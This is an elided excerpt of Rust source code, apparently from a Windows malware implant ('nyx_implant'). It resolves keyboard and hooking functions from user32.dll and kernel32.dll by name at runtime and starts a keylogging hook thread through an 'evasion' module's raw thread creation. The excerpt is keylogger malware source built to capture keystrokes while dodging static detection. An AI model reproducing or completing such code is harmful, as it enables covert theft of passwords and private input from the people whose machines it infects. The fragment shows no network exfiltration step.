...
fn get_async_key_state_fn() -> Option<unsafe extern "system" fn(i32) -> i16> {
    ...
    let addr =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetAsyncKeyState") }?;
...
fn get_keyboard_layout_fn() -> Option<GetKeyboardLayoutFn> {
    ...
    let addr =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetKeyboardLayout") }?;
...
fn get_keyboard_state_fn() -> Option<GetKeyboardStateFn> {
    ...
    let addr =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetKeyboardState") }?;
...
fn map_virtual_key_ex_fn() -> Option<MapVirtualKeyExWFn> {
    ...
    let addr =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"MapVirtualKeyExW") }?;
...
fn to_unicode_ex_fn() -> Option<ToUnicodeExFn> {
    ...
    let addr = unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"ToUnicodeEx") }?;
...
fn get_key_state_fn() -> Option<unsafe extern "system" fn(i32) -> i16> {
    ...
    let addr = unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetKeyState") }?;
...
fn resolve_hook_raw() -> Option<HookRaw> {
    ...
    let set_windows_hook_ex_w =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"SetWindowsHookExW")? };
    let unhook_windows_hook_ex =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"UnhookWindowsHookEx")? };
    let call_next_hook_ex =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"CallNextHookEx")? };
    let get_message_w =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"GetMessageW")? };
    let post_thread_message_w =
        unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"PostThreadMessageW")? };
    let get_current_thread_id =
        unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetCurrentThreadId")? };
...
unsafe fn call_next_hook_resolved(n_code: i32, w_param: usize, l_param: isize) -> isize {
    ...
    let addr = if cached != 0 {
        ...
        match unsafe { nyx_implant_core::resolve::export_addr(b"user32.dll", b"CallNextHookEx") } {
            Some(a) => {
...
fn start_hook_thread_spawn(raw: HookRaw) -> Option<*mut KeylogThreadParams> {
    ...
    let handle = unsafe {
        nyx_implant_evasion::sleep::raw_create_thread(keylog_hook_thread, params as usize)
    };
...
fn stop_hook_thread_join(handle: usize) {
    if let Some(wait_addr) =
        unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject") }
    {
